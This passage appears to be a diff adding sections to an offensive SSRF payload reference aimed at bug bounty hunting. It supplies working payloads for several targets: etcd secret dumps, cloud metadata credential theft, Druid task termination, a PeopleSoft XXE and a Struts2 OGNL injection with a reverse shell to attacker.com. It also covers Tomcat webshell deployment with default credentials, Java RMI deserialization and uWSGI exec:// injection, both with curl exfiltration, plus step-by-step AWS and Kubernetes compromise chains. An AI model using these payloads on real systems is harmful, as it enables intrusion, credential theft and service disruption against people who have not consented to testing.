@@ -1464,11 +1464,446 @@ http://127.1.1.1:80:\@@127.2.2.2:80/
 
 ---
 
+## Kubernetes etcd Direct API SSRF
+
+**Root cause:** etcd is the distributed key-value store backing all of Kubernetes — it stores every secret, ConfigMap, service account token, and pod spec in the cluster. The etcd v2 HTTP API on port 2379 requires no authentication in default single-node deployments and many managed K8s setups that rely on network-level isolation. An SSRF reaching `127.0.0.1:2379` can dump the entire cluster state.
+
+**Bypass logic:** The v2 API (`/v2/keys/?recursive=true`) returns everything in a single JSON response. The v3 API uses binary gRPC, but the v2 HTTP API is often still enabled alongside it. No credentials required in default setups.
+
+**Attack chain:** SSRF → etcd port 2379 → dump all K8s secrets → service account tokens, DB passwords, API keys, TLS certificates → full cluster compromise
+
+**Stack:** All Kubernetes environments (EKS, GKE, AKS, k3s, self-hosted); etcd on control plane nodes or accessible from pod network
+
+**Payload:**
+```
+# Detection — etcd version and status
+http://127.0.0.1:2379/version
+http://127.0.0.1:2379/health
+
+# Dump ALL keys recursively (v2 API) — returns entire cluster state
+http://127.0.0.1:2379/v2/keys/?recursive=true
+
+# List all secrets across all namespaces
+http://127.0.0.1:2379/v2/keys/registry/secrets?recursive=true
+
+# Get a specific secret (JSON-encoded, base64 values)
+http://127.0.0.1:2379/v2/keys/registry/secrets/default/my-secret
+
+# etcd member list (reveals cluster topology)
+http://127.0.0.1:2379/v2/members
+
+# Prometheus metrics (leaks cluster topology + key counts)
+http://127.0.0.1:2379/metrics
+
+# Alternate port (older etcd deployments)
+http://127.0.0.1:4001/v2/keys/?recursive=true
+```
+
+**Source:** PayloadsAllTheThings SSRF-Cloud-Instances.md, assetnote/blind-ssrf-chains, Kubernetes etcd API docs
+
+---
+
+## Additional Cloud Provider Metadata Endpoints
+
+**Root cause:** Every cloud provider exposes an IMDS-style endpoint from within instances. Many SSRF filters block `169.254.169.254` but not provider-specific subpaths or alternative hostnames. European and Asian cloud providers (Hetzner, Tencent, Huawei) are systematically under-tested in bug bounty programs targeting global SaaS infrastructure.
+
+**Bypass logic:** Provider-specific metadata paths differ from the standard AWS `/latest/meta-data/` prefix. Rancher uses a non-IP hostname. PacketCloud (Equinix Metal) uses `metadata.packet.net` instead of the link-local address — bypassing filters that only block `169.254.x.x`.
+
+**Attack chain:** SSRF → cloud metadata → instance credentials / API tokens / SSH public keys → cloud account pivot
+
+**Stack:** Hetzner Cloud, PacketCloud/Equinix Metal, OpenStack/RackSpace, HP Helion, Rancher, Tencent Cloud, Huawei Cloud, Linode/Akamai
+
+**Payload:**
+```
+# Hetzner Cloud — no special header required
+http://169.254.169.254/hetzner/v1/metadata
+http://169.254.169.254/hetzner/v1/metadata/hostname
+http://169.254.169.254/hetzner/v1/metadata/instance-id
+http://169.254.169.254/hetzner/v1/metadata/public-ipv4
+http://169.254.169.254/hetzner/v1/metadata/private-networks   # internal network topology
+http://169.254.169.254/hetzner/v1/metadata/availability-zone
+
+# PacketCloud / Equinix Metal — uses hostname (bypasses 169.254.x.x IP filters)
+http://metadata.packet.net/userdata
+http://metadata.packet.net/metadata
+
+# OpenStack / RackSpace
+http://169.254.169.254/openstack
+http://169.254.169.254/openstack/latest/meta_data.json        # hostname, keys, UUIDs
+http://169.254.169.254/openstack/latest/user_data             # cloud-init scripts
+http://169.254.169.254/openstack/latest/network_data.json     # network topology
+
+# HP Helion (legacy enterprise private cloud)
+http://169.254.169.254/2009-04-04/meta-data/
+
+# Rancher (container orchestration platform) — non-IP hostname
+http://rancher-metadata/latest/self/service/name
+http://rancher-metadata/latest/self/container/name
+http://rancher-metadata/latest/self/host/agent_ip
+
+# Tencent Cloud
+http://metadata.tencentyun.com/latest/meta-data/
+http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
+
+# Huawei Cloud (OpenStack-compatible format)
+http://169.254.169.254/openstack/latest/meta_data.json
+
+# Linode / Akamai Cloud
+http://169.254.169.254/v1/
+http://169.254.169.254/v1/instance
+```
+
+**Source:** PayloadsAllTheThings SSRF-Cloud-Instances.md, cloud provider IMDS documentation
+
+---
+
+## Apache Druid SSRF (Unauthenticated Admin API)
+
+**Root cause:** Apache Druid (real-time analytics database) exposes a REST API on ports 8080, 8082, 8088, and 8090 without authentication in default deployments. The API allows querying data sources, listing ingestion tasks, and — critically — terminating running supervisors and tasks. SSRF reaching Druid enables both data enumeration and disruption of production analytics pipelines.
+
+**Bypass logic:** Druid's REST API is plain HTTP with no authentication gate in default configurations. The coordinator, broker, and overlord roles run on different ports, multiplying the SSRF surface. In cloud-native environments Druid is often deployed on a dedicated internal subnet reachable from application servers.
+
+**Attack chain:** SSRF → Druid API → enumerate data sources (business-sensitive metrics) → terminate ingestion supervisors → disrupt analytics pipeline | or → query raw data → exfil business intelligence data
+
+**Stack:** Apache Druid 0.x–29.x (common in ad-tech, data engineering stacks at analytics SaaS companies)
+
+**Payload:**
+```
+# Detection
+http://127.0.0.1:8888/_status/selfDiscovered/status
+http://127.0.0.1:8080/druid/coordinator/v1/leader
+http://127.0.0.1:8080/status/selfDiscovered
+
+# Enumerate data sources (data exfil)
+http://127.0.0.1:8080/druid/coordinator/v1/metadata/datasources
+http://127.0.0.1:8082/druid/v2/datasources
+
+# List active ingestion tasks
+http://127.0.0.1:8090/druid/indexer/v1/tasks?state=running
+http://127.0.0.1:8090/druid/indexer/v1/tasks?state=pending
+
+# Disruptive: terminate all tasks for a datasource (DoS — POST via gopher/307)
+POST http://127.0.0.1:8090/druid/indexer/v1/datasources/TARGET/shutdownAllTasks
+
+# Disruptive: terminate ALL supervisors (kills all streaming ingestion)
+POST http://127.0.0.1:8090/druid/indexer/v1/supervisor/terminateAll
+
+# Port mapping by role:
+# 8080 / 8888 — Coordinator (cluster management)
+# 8081        — Historical (segment storage)
+# 8082        — Broker (query routing)
+# 8083        — Middle Manager
+# 8090        — Overlord (task management)
+```
+
+**Source:** assetnote/blind-ssrf-chains, Apache Druid REST API documentation
+
+---
+
+## PeopleSoft SSRF via XML Listener (XXE Chain)
+
+**Root cause:** Oracle PeopleSoft exposes an `HttpListeningConnector` endpoint at `/PSIGW/HttpListeningConnector` for enterprise integration. This endpoint accepts XML with `DOCTYPE SYSTEM` external entities — the XML parser resolves entity URLs server-side, creating a blind XXE → SSRF chain. The endpoint requires no authentication and is often internet-facing as it handles B2B integrations.
+
+**Bypass logic:** The integration gateway endpoint is designed for system-to-system communication, not end-users. Security reviews typically focus on the authenticated web portal, not the integration layer. No content-type filter prevents injection.
+
+**Attack chain:** SSRF → PeopleSoft XML listener → XXE entity resolves to internal host → cloud metadata endpoint → credential theft | or → internal API enumeration
+
+**Stack:** Oracle PeopleSoft HCM, FSCM, Campus Solutions (large enterprises, universities, government agencies)
+
+**Payload:**
+```xml
+<!-- POST to: https://target.com/PSIGW/HttpListeningConnector -->
+<!-- Content-Type: text/xml -->
+
+<!DOCTYPE IBRequest [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+]>
+<IBRequest>
+  <ExternalOperationName>&xxe;</ExternalOperationName>
+  <OperationType/>
+  <From>
+    <RequestingNode/>
+    <Password/>
+    <OrigUser/>
+    <OrigNode/>
+    <OrigProcess/>
+    <OrigTimeStamp/>
+  </From>
+  <To>
+    <FinalDestination/>
+    <DestinationNode/>
+    <SubChannel/>
+  </To>
+  <ContentSections>
+    <ContentSection>
+      <NonRepudiation/>
+      <MessageVersion/>
+      <Data/>
+    </ContentSection>
+  </ContentSections>
+</IBRequest>
+
+<!-- Blind OOB probe (replace IMDS URL with Collaborator): -->
+<!DOCTYPE IBRequest [
+  <!ENTITY xxe SYSTEM "http://YOUR-ID.oast.fun/peoplesoft-xxe">
+]>
+
+<!-- Discovery: probe the endpoint for 200/500 vs 404 -->
+GET /PSIGW/HttpListeningConnector
+```
+
+**Source:** assetnote/blind-ssrf-chains, PeopleSoft Integration Broker security research
+
+---
+
+## Apache Struts2 SSRF → OGNL RCE (S2-016)
+
+**Root cause:** Apache Struts2 CVE-2013-2248 (S2-016) allows arbitrary OGNL (Object-Graph Navigation Language) expressions inside the `redirect:`, `action:`, and `redirectAction:` URL prefixes. The expression is evaluated server-side with full JVM access. When an internal Struts2 app is reachable via SSRF, this becomes an SSRF → OGNL → RCE chain requiring no credentials.
+
+**Bypass logic:** The redirect parameters are a standard Struts2 feature. OGNL evaluation inside them was unintended. Many legacy Struts2 apps in banking and government were never patched past 2013. The OGNL payload can be URL-encoded to evade naive WAFs.
+
+**Attack chain:** SSRF → internal Struts2 endpoint → inject OGNL via `?redirect:` param → `ProcessBuilder` execution → OS command → RCE
+
+**Stack:** Apache Struts2 2.0.0–2.3.15 (legacy banking, insurance, government Java portals)
+
+**Payload:**
+```
+# Struts2-016 — OGNL in redirect: prefix
+# OOB detection (safe, non-destructive):
+http://127.0.0.1:8080/app/index.action?redirect:%24%7B%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]%7B%22curl%22%2C%22http%3A//YOUR-ID.oast.fun%22%7D)).start()%7D
+
+# Decoded payload:
+?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"curl","http://attacker.com"})).start()}
+
+# Read file (reflected in response if output captured):
+?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=#d.readLine(),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}
+
+# Reverse shell:
+?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash","-c","bash -i >& /dev/tcp/attacker.com/4444 0>&1"})).start()}
+
+# Also test alternate prefixes:
+?action:${OGNL_EXPRESSION}
+?redirectAction:${OGNL_EXPRESSION}
+```
+
+**Source:** CVE-2013-2248 (Struts2 S2-016), assetnote/blind-ssrf-chains
+
+---
+
+## W3 Total Cache SSRF — CVE-2019-6715 (WordPress Plugin)
+
+**Root cause:** The W3 Total Cache WordPress plugin (< 0.9.7.3) exposes an unauthenticated SNS subscription endpoint at `/wp-content/plugins/w3-total-cache/pub/sns.php`. This endpoint fetches a `SubscribeURL` from the request body to "confirm" Amazon SNS subscriptions. The URL is fully attacker-controlled and the server-side fetch is unauthenticated — textbook SSRF.
+
+**Bypass logic:** The endpoint is designed to process AWS SNS webhook callbacks. AWS SNS confirmation requests don't carry user authentication, so the endpoint was intentionally left unauthenticated. With 1M+ active WordPress installations, this is an extremely high-coverage SSRF vector on any AWS-hosted WordPress site.
+
+**Attack chain:** SSRF → W3TC SNS endpoint → server fetches SubscribeURL → blind SSRF → AWS IMDS → credential theft (ironic: abusing AWS integration to steal AWS credentials)
+
+**Stack:** WordPress with W3 Total Cache plugin < 0.9.7.3 (1M+ active installs); highest impact on AWS-hosted WordPress
+
+**Payload:**
+```http
+PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
+Host: target.com
+Content-Type: application/json
+x-amz-sns-message-type: SubscriptionConfirmation
+
+{
+  "Type": "SubscriptionConfirmation",
+  "TopicArn": "arn:aws:sns:us-east-1:123456789012:test",
+  "Token": "test",
+  "SubscribeURL": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+  "Timestamp": "2019-01-01T00:00:00.000Z",
+  "SignatureVersion": "1",
+  "Signature": "test",
+  "SigningCertURL": "https://sns.us-east-1.amazonaws.com/test.pem",
+  "MessageId": "test"
+}
+```
+
+```http
+# OOB blind confirmation payload:
+{
+  "Type": "SubscriptionConfirmation",
+  "TopicArn": "arn:aws:sns:us-east-1:123456789012:test",
+  "SubscribeURL": "http://YOUR-ID.oast.fun/w3tc-ssrf",
+  "Token": "test",
+  "Timestamp": "2019-01-01T00:00:00.000Z",
+  "SignatureVersion": "1",
+  "Signature": "test",
+  "SigningCertURL": "https://sns.us-east-1.amazonaws.com/test.pem",
+  "MessageId": "test"
+}
+
+# Discovery: check if plugin file exists (returns 200 vs 404)
+GET /wp-content/plugins/w3-total-cache/pub/sns.php
+```
+
+**Source:** CVE-2019-6715, Paulos Yibelo disclosure, WPScan vulnerability database
+
+---
+
+## Apache Tomcat WAR Deployment via Gopher
+
+**Root cause:** Apache Tomcat's Manager application at `/manager/text` allows WAR file deployment via authenticated HTTP POST. In Tomcat 6 and misconfigured later versions, the Manager uses default credentials (`tomcat:tomcat`, `admin:admin`). Gopher can craft multipart HTTP requests including Basic auth headers, enabling WAR deployment — and JSP webshell execution — via SSRF.
+
+**Bypass logic:** The Manager is a legitimate Tomcat administrative interface accessible on `127.0.0.1:8080` internally. Many deployments retain default credentials or weak auth that is not testable from outside but becomes exploitable via SSRF from the server itself.
+
+**Attack chain:** SSRF → gopher → Tomcat Manager (port 8080) → deploy WAR with JSP shell → HTTP request to shell → OS command execution as Tomcat user
+
+**Stack:** Apache Tomcat 6.x–9.x with Manager app enabled and default/weak credentials (common in legacy Java EE apps, CI/CD deploy servers, Jenkins)
+
+**Payload:**
+```
+# Step 1: Detect Manager (GET-based SSRF)
+http://127.0.0.1:8080/manager/html
+http://127.0.0.1:8080/manager/text
+
+# Step 2a: Deploy WAR from URL (Manager text API — server fetches the WAR)
+GET http://127.0.0.1:8080/manager/deploy?war=http://attacker.com/pwn.war&path=/pwn HTTP/1.1
+Authorization: Basic dG9tY2F0OnRvbWNhdA==   # tomcat:tomcat
+
+# Step 2b: Deploy WAR via multipart POST (gopher — for file upload)
+# Tool: https://github.com/pimps/gopher-tomcat-deployer
+python3 gopher-tomcat-deployer.py --target 127.0.0.1:8080 --war pwn.war --path /pwn --user tomcat --pass tomcat
+# → generates gopher:// URL to use as SSRF payload
+
+# Step 3: Execute via the deployed shell
+http://127.0.0.1:8080/pwn/shell.jsp?cmd=id
+
+# Common credentials to try:
+# tomcat:tomcat  |  admin:admin  |  tomcat:s3cret  |  admin:(blank)  |  root:root
+
+# Undeploy for cleanup:
+GET http://127.0.0.1:8080/manager/undeploy?path=/pwn
+Authorization: Basic dG9tY2F0OnRvbWNhdA==
+```
+
+**Source:** assetnote/blind-ssrf-chains, gopher-tomcat-deployer (pimps/gopher-tomcat-deployer)
+
+---
+
+## Java RMI via Gopher → Deserialization RCE
+
+**Root cause:** Java RMI (Remote Method Invocation) registries listen on ports 1090, 1098, 1099, and 4443–4446. All RMI communication uses Java native object serialization. If the target classpath includes a vulnerable library (Apache Commons Collections, Spring Framework, Groovy), sending a crafted serialized payload triggers deserialization and executes arbitrary code. The `remote-method-guesser` tool generates gopher-encoded RMI payloads for SSRF delivery.
+
+**Bypass logic:** RMI is common in Java EE environments (JBoss, WebLogic, Jenkins, Spring Remoting). Registry ports are rarely firewalled internally. No authentication is needed to query the RMI registry — it's a feature. The deserialization happens before any access control is enforced.
+
+**Attack chain:** SSRF → gopher → RMI registry port 1099 → send deserialize payload (CommonsCollections gadget) → JVM executes embedded command → RCE as service user
+
+**Stack:** Java apps with JBoss, WebLogic, Jenkins, old Spring; any JVM with Commons Collections 3.1–3.2.1 or 4.0 on classpath
+
+**Payload:**
+```bash
+# Step 1: Probe RMI ports (timing-based via GET SSRF)
+http://127.0.0.1:1099/   # Fast connect + binary response = open
+http://127.0.0.1:1098/   # Alt RMI port
+http://127.0.0.1:4443/   # SSL RMI
+http://127.0.0.1:4444/   # Common alt port
+
+# Step 2: Generate gopher payload with remote-method-guesser
+# https://github.com/qtc-de/remote-method-guesser
+rmg --ssrf --gopher --target 127.0.0.1:1099 serial CommonsCollections6 "curl http://attacker.com/?x=$(id|base64)"
+
+# Step 3: Use generated gopher:// URL as SSRF payload
+
+# Step 4: Alternatively — ysoserial + manual gopher wrapping
+java -jar ysoserial.jar CommonsCollections6 "curl http://YOUR-ID.oast.fun" | base64
+
+# Gadget chains (try in order):
+# CommonsCollections6 → Commons Collections 3.1-3.2.1 (most prevalent)
+# CommonsCollections1 → CC 3.1 with Transformer chain
+# Spring1 / Spring2  → Spring Framework 4.1.4+
+# Groovy1            → Groovy 2.3.9+
+# JRMPClient         → triggers remote deserialization via JRMP callback
+
+# Registry enumeration (before exploit):
+rmg --enum 127.0.0.1:1099
+```
+
+**Source:** assetnote/blind-ssrf-chains, remote-method-guesser (qtc-de), ysoserial project
+
+---
+
+## uWSGI Configuration Injection via Gopher → RCE
+
+**Root cause:** uWSGI uses a custom binary protocol on its configured socket (typically port 5000 or 8000). The protocol allows the client to pass arbitrary environment variables including `UWSGI_FILE`. Setting `UWSGI_FILE=exec://cmd` triggers uWSGI to execute the command as part of its app loading mechanism. Gopher can speak the binary uWSGI protocol, turning any SSRF reaching uWSGI into RCE.
+
+**Bypass logic:** uWSGI's binary protocol is not HTTP — standard HTTP-only SSRF cannot exploit it. Gopher sends raw bytes. The `exec://` pseudo-scheme is a legitimate uWSGI feature for dynamic app loading; there is no exploit required — just protocol knowledge.
+
+**Attack chain:** SSRF → gopher → uWSGI socket → inject `UWSGI_FILE=exec://command` → uWSGI executes command as app user → RCE
+
+**Stack:** Python/Django, PHP, Ruby apps using uWSGI (common in nginx + uWSGI setups, Kubernetes Python microservices)
+
+**Payload:**
+```python
+# Generate uWSGI gopher payload:
+# https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py
+python3 uwsgi_exp.py -u 127.0.0.1:5000 -c "curl http://attacker.com/?x=$(id|base64)"
+
+# The tool outputs a gopher:// URL to use as SSRF payload
+
+# Key uWSGI environment variables injected:
+# UWSGI_FILE = exec://bash -c 'COMMAND'   → executes command
+# PHP_VALUE  = auto_prepend_file=/etc/passwd  → if PHP mode
+
+# Detection: probe uWSGI ports (binary response or instant error ≠ timeout)
+http://127.0.0.1:5000/
+http://127.0.0.1:8000/
+http://127.0.0.1:8001/
+
+# Common uWSGI ports:
+# 5000, 8000, 9090 (conflicts with PHP-FPM: 9000), 3031
+# Also accessible via Unix socket: /run/uwsgi/app.sock (file:// SSRF)
+```
+
+**Source:** wofeiwo/webcgi-exploits (uWSGI PoC), PayloadsAllTheThings SSRF advanced section
+
+---
+
+## DNS AXFR Zone Transfer via Gopher
+
+**Root cause:** DNS AXFR (zone transfer) copies all DNS records from a nameserver. Internal DNS servers frequently allow AXFR queries from localhost or internal IPs, relying on network isolation rather than explicit ACLs. Gopher can send raw binary DNS-over-TCP requests to port 53. A successful zone transfer reveals every internal hostname and IP — enabling maximally targeted SSRF follow-up attacks.
+
+**Bypass logic:** AXFR requires TCP (unlike normal DNS queries which use UDP). Gopher speaks raw TCP, so it can craft the binary DNS AXFR frame. The restriction is per-source-IP: from the SSRF host's perspective, the query originates from the trusted internal IP, bypassing source-IP restrictions.
+
+**Attack chain:** SSRF → gopher → internal DNS port 53 → AXFR zone transfer → enumerate all internal hostnames → build targeted SSRF hit list → attack discovered internal services
+
+**Stack:** BIND, PowerDNS, Windows DNS with split-horizon internal zones; any environment with internal DNS allowing AXFR from localhost
+
+**Payload:**
+```bash
+# DNS AXFR via gopher (TCP DNS — AXFR requires TCP, not UDP):
+# Use SSRFmap DNS module or craft binary frame manually
+
+# SSRFmap automated zone transfer:
+python3 ssrfmap.py -r request.txt -p url -m dns_axfr --dns-domain corp.internal
+
+# Manual: binary AXFR request frame for "corp.internal"
+# (Transaction ID 0xAAAA + Standard query flags + QTYPE=AXFR(252) + QCLASS=IN(1) + QNAME)
+gopher://127.0.0.1:53/_%AA%AA%01%00%00%01%00%00%00%00%00%00%04corp%08internal%00%00%FC%00%01
+
+# Probe DNS port first:
+http://127.0.0.1:53/    # Binary garbage response = DNS running
+dict://127.0.0.1:53/    # Alternative probe
+
+# After zone transfer: prioritize discovered hostnames:
+# admin.corp.internal  → admin panels
+# db.corp.internal     → database servers  
+# jenkins.corp.internal → CI/CD (Groovy RCE)
+# vault.corp.internal   → HashiCorp Vault (secrets)
+# redis.corp.internal   → Redis (gopher → RCE)
+# k8s.corp.internal    → Kubernetes API
+```
+
+**Source:** PayloadsAllTheThings SSRF advanced exploitation, SSRFmap DNS module
+
+---
+
 ## Threat Model
 
-> Current patterns as of 2026-Q2. Updated 2026-05-25.
+> Current patterns as of 2026-Q2. Updated 2026-05-27.
 
-**What's being exploited in the wild (2026-05-25):**
+**What's being exploited in the wild (2026-05-27):**
 
 1. **Headless browser SSRFs** — PDF/screenshot services using Puppeteer/Chrome are the
    #1 new SSRF vector. Targets include SaaS report generators, invoice PDFs, and
@@ -1533,6 +1968,28 @@ http://127.1.1.1:80:\@@127.2.2.2:80/
     (/proxy.stream, 8080) are all proven SSRF → RCE chains in enterprise-heavy environments.
     Internal network recon via SSRF should always probe these ports.
 
+15. **etcd (Kubernetes key-value store) as the highest-value SSRF target** — etcd at
+    `127.0.0.1:2379` stores every Kubernetes secret in plaintext JSON. A single GET to
+    `/v2/keys/?recursive=true` dumps the entire cluster state. No auth required in default
+    deployments. This is definitively more impactful than stealing a single IAM role.
+
+16. **Non-AWS cloud providers systematically under-tested** — Hetzner, Tencent Cloud,
+    Huawei Cloud, PacketCloud/Equinix Metal, and OpenStack deployments all expose IMDS
+    endpoints. Bug bounty programs hosted on these clouds are less likely to have SSRF
+    defenses tuned for non-AWS metadata paths. PacketCloud uses `metadata.packet.net`
+    (bypasses all 169.254.x.x IP-based filters).
+
+17. **WordPress SSRF via W3 Total Cache (CVE-2019-6715) widely unpatched** — With 1M+
+    active WordPress installations using W3 Total Cache, any AWS-hosted WordPress target
+    is a candidate for unauthenticated SNS endpoint SSRF → IMDS credential theft. The
+    endpoint requires no auth and the plugin auto-update rate is low on self-hosted WordPress.
+
+18. **uWSGI and Java RMI as overlooked gopher targets** — Python microservices using uWSGI
+    and legacy Java apps with RMI registries are consistently under-probed. uWSGI's binary
+    protocol → `exec://` injection requires no credentials and produces instant RCE. Java
+    RMI deserialization via CommonsCollections gadget chains remains viable in unpatched
+    enterprise Java middleware.
+
 ---
 
 ## Bypass Matrix
@@ -1558,6 +2015,11 @@ http://127.1.1.1:80:\@@127.2.2.2:80/
 | Blocks `127.0.0.1` (string match) | `[::ffff:127.0.0.1]` or `[::ffff:7f00:1]` | IPv6-mapped form; semantically identical |
 | Mixed-library validation (validate A, request B) | `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/` or `http://127.1.1.1:80\@192.168.1.1/` | Different parsers extract different host fields |
 | Domain allowlist via EC2 hostname | `http://instance-data/latest/meta-data/` | EC2 DNS resolves to 169.254.169.254; bypasses IP-based checks |
+| Blocks 169.254.x.x (IP filter) | `http://metadata.packet.net/userdata` | PacketCloud IMDS uses hostname, not link-local IP |
+| Blocks `169.254.169.254` on AWS target | `http://metadata.tencentyun.com/` or `http://rancher-metadata/` | Alternative cloud/orchestration metadata not IP-blocked |
+| HTTP-only SSRF (binary services) | `gopher://127.0.0.1:5000/_UWSGI_PAYLOAD` or `gopher://127.0.0.1:1099/_RMI_PAYLOAD` | gopher speaks binary protocols (uWSGI, RMI, FastCGI) |
+| etcd hidden behind K8s network | `http://127.0.0.1:2379/v2/keys/?recursive=true` | etcd v2 HTTP API needs no auth; colocated with control plane |
+| WordPress target with W3 Total Cache | PUT to `/wp-content/plugins/w3-total-cache/pub/sns.php` with JSON SubscribeURL | CVE-2019-6715: unauthenticated SSRF via SNS confirmation endpoint |
 
 ---
 
@@ -1594,6 +2056,17 @@ http://127.1.1.1:80:\@@127.2.2.2:80/
 | GitLab Prometheus Redis Exporter at `127.0.0.1:9121` | `/scrape?target=redis://` dumps any Redis instance | SSRF → Redis exporter → full Redis key dump |
 | JBoss AS at `127.0.0.1:8080` | JMX console (no auth) deploys WAR from remote URL | SSRF → JBoss JMX → deploy WAR → RCE |
 | Legacy CGI endpoints (old systems) | Shellshock (CVE-2014-6271) via User-Agent in gopher | SSRF → gopher → CGI Shellshock → bash RCE |
+| Kubernetes etcd at `127.0.0.1:2379` | v2 HTTP API, no auth required; stores ALL cluster secrets | Dump every K8s secret, service account token, and certificate in one request |
+| Apache Druid at `127.0.0.1:8080/8090` | REST API, no auth by default; task/supervisor management | Enumerate data sources (business-sensitive metrics) + terminate ingestion → analytics DoS |
+| PeopleSoft XML listener (`/PSIGW/HttpListeningConnector`) | Unauthenticated XML endpoint with XXE | XXE → SSRF → IMDS credential theft from enterprise Oracle deployments |
+| Apache Struts2 internal app (port 8080) | S2-016 OGNL injection via redirect parameter (CVE-2013-2248) | SSRF → OGNL → ProcessBuilder → RCE on legacy banking/government Java apps |
+| WordPress + W3 Total Cache (any version < 0.9.7.3) | Unauthenticated SNS endpoint → server-side fetch of SubscribeURL (CVE-2019-6715) | SSRF → IMDS on AWS-hosted WordPress → IAM credential theft |
+| Apache Tomcat Manager at `127.0.0.1:8080` | Default creds (tomcat:tomcat); WAR deploy via Manager text API | SSRF → gopher → WAR deploy → JSP shell → RCE as Tomcat user |
+| Java RMI registry at `127.0.0.1:1099` | Java deserialization with Commons Collections gadget chain | SSRF → gopher → RMI → deserialization → OS command execution |
+| uWSGI socket at `127.0.0.1:5000/8000` | Binary uWSGI protocol; `UWSGI_FILE=exec://cmd` triggers execution | SSRF → gopher → uWSGI → exec:// injection → RCE as app user |
+| Hetzner/PacketCloud/OpenStack IMDS | Alternative cloud IMDS endpoints; less-filtered than AWS 169.254.169.254 | Cloud credential theft from non-AWS infrastructure; bypasses AWS-specific filters |
+| Internal DNS server at `127.0.0.1:53` | AXFR zone transfer allowed from localhost → full internal hostname enumeration | DNS zone dump → discover all internal hosts → build targeted SSRF hit list |
+| Rancher metadata (`rancher-metadata`) | Container orchestration metadata via hostname (not IP) | Service/container name, host IPs, orchestration topology — bypasses IP-based blocklists |
 
 ---
 
@@ -1708,4 +2181,48 @@ Impact: Critical — AWS credential theft via file upload
 7. Inside container: ls /host/etc → read /host/etc/shadow, add SSH key to /host/root/.ssh/
 
 Impact: Critical — full host OS compromise via container escape
+```
+
+### Chain 8: WordPress W3TC SSRF → AWS IMDS → Full Account Compromise
+
+```
+1. Target: AWS-hosted WordPress site (common: WP Engine, Kinsta, self-hosted EC2)
+2. Confirm W3 Total Cache plugin: GET /wp-content/plugins/w3-total-cache/pub/sns.php → 200
+3. Send unauthenticated SSRF payload (CVE-2019-6715):
+   PUT /wp-content/plugins/w3-total-cache/pub/sns.php
+   Content-Type: application/json
+   x-amz-sns-message-type: SubscriptionConfirmation
+   {"Type":"SubscriptionConfirmation","SubscribeURL":"http://YOUR-ID.oast.fun/","Token":"x",...}
+4. Confirm blind SSRF via OOB callback
+5. Change SubscribeURL to:
+   http://169.254.169.254/latest/meta-data/iam/security-credentials/
+6. Response reveals IAM role name → fetch full credentials:
+   {"SubscribeURL":"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ROLE"}
+7. Export AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY + AWS_SESSION_TOKEN
+8. aws s3 ls → dump all buckets; aws secretsmanager list-secrets → dump DB creds, API keys
+
+Impact: Critical — unauthenticated SSRF to full AWS credential theft on any unpatched WordPress
+```
+
+### Chain 9: SSRF → etcd → Full Kubernetes Cluster Secrets Dump
+
+```
+1. SSRF found in any feature (webhook, URL preview, image fetch) running inside a K8s pod
+2. Probe etcd (usually co-located with control plane or accessible via service):
+   http://127.0.0.1:2379/version → returns {"etcdserver":"3.x.x",...}
+3. Dump ALL cluster secrets in a single request:
+   http://127.0.0.1:2379/v2/keys/registry/secrets?recursive=true
+4. JSON response contains base64-encoded secret values for every namespace
+5. Decode secrets: echo "BASE64VALUE" | base64 -d | python3 -c "import sys,json;d=json.load(sys.stdin);print(d)"
+6. Extracted secrets include:
+   - Database passwords (postgres, mysql, redis)
+   - Service account tokens for other services
+   - API keys for external services (Stripe, Twilio, etc.)
+   - TLS certificates and private keys
+   - Cloud provider credentials stored as K8s secrets
+7. Use any extracted service account token to escalate:
+   curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/pods
+   → list all pods → exec into privileged pods → full cluster compromise
+
+Impact: Critical — single SSRF request dumps every secret in the Kubernetes cluster
 ```
